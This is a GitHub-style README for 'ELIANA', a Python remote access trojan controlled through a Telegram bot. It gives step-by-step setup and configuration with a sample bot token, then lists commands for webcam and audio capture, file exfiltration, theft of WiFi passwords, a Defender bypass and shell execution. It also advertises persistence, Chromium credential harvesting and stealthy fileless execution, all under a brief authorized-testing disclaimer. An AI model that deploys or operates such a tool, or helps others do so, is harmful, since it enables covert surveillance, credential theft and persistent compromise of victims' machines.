# **ELIANA – Remote Access Trojan (RAT)**  
A Python-based Command-and-Control (C2) framework designed **exclusively for authorized VAPT (Vulnerability Assessment & Penetration Testing)**.  
ELIANA enables security testers with explicit permission to remotely execute commands, gather system information, and perform surveillance — all through a **Telegram Bot** interface.

---

# 🚀 **Quick Setup**

### 1. Clone the Repository & Install Requiremnts
```bash
git clone https://github.com/Adrilaw/ELIANA-Remote-Access-Trojan.git

cd ELIANA-Remote-Access-Trojan

pip install -r requirements.txt
```

# 📋 **Configuration**


## Step 1: Get Your Telegram Credentials

### 1. Retrieve Your Telegram User ID

Go to https://web.telegram.org

Search: @userinfobot

Send /start

Copy your numerical User ID

### 2. Create a Telegram Bot

Open Telegram

Search @BotFather

Send /newbot

Set bot name + username

Copy the API token provided


### 3. Configure ELIANA_RAT.py

Open the script:

#### Windows
```bash
notepad ELIANA_RAT.py
```

#### Linux / macOS
```bash
nano ELIANA_RAT.py
```

#### Find and edit:
```
TELEGRAM_TOKEN = "Bot API Key"
TELEGRAM_CHAT_ID = "User ID"
```

#### Example of correct configuration 

```
# ==================== CONFIG ====================
# REPLACE THESE WITH YOUR CREDENTIALS!
TELEGRAM_TOKEN = 72280279:AAHV9S9dRWQFgBUY9XgUg5Sp5SNY9BNnSKw"
TELEGRAM_CHAT_ID = "5675463344"
# ===============================================
```

### 4. Start the RAT - Just testing to see if connections is succesful then move to next step
```bash
python3 ELIANA_RAT.py
```
##### Expected output:

╔══════════════════════════════════════╗
║       ELIANA RAT v1.0 - Active       ║
╠══════════════════════════════════════╣
║ Target: 5345463344                   ║
║ User: Administrator                  ║
║ System: Windows 10                   ║
╚══════════════════════════════════════╝
📡 Waiting for commands...

## ⚙️ **Available Commands**

### 🎥 **Media Capture**

webcam — Take webcam photo

webcam 10 — Record webcam video

audio 10 — Record microphone audio

### 📁 **File & Directory Operations**

ls — List files

cd <folder> — Change directory

pwd — Show working directory

read <file> — Read file contents

upload <file> — Upload file to operator

download <URL> — Download file

### 🖥️ **System Information**

sysinfo — System profile

ps — List processes

netstat — Network connections

ip — Network configuration

wifi — Retrieve saved WiFi passwords

### 🔧 **System Control**

shutdown — Shut down target

reboot — Restart

lock — Lock system

defender — Attempt Defender bypass

### 🛠️ **Utilities**

cmd <command> — Execute shell command

clear — Clear terminal

## ✨ **Key Features**

Persistence — Registry, Scheduled Tasks, Startup folder

Surveillance — Webcam, audio, screenshots, screen recording

Credential Harvesting — Chromium password extraction

File Operations — Diskless upload/download

Stealth — Fileless execution, delayed beaconing

Reliability — Multi-method failover for commands

## 👤 **About the Author**

I am Dodin Mel-Adrien (Kidpentester / Adrilaw).
ELIANA was built during my cybersecurity internship to demonstrate how Telegram can be used as a lightweight C2 for authorized penetration tests.

This project is personally meaningful — inspired by my wife, whose resilience and strength motivated me to push forward, learn, and build tools that sharpen my cybersecurity skills.

## 🔥 **Credits**

https://github.com/FebVeg/TGRS

https://github.com/gunzf0x/BypassAMSI_PSRevshell

## 📜 **License**

ELIANA is licensed under the:

GNU General Public License

ELIANA Commercial License

## ⚠️ **Legal & Ethical Notice**

This tool is for authorized penetration testing only, with written permission.
Any unauthorized use — including surveillance, credential harvesting, persistence installation, or system manipulation — is illegal and unethical.

Use responsibly.
Operate within the law.
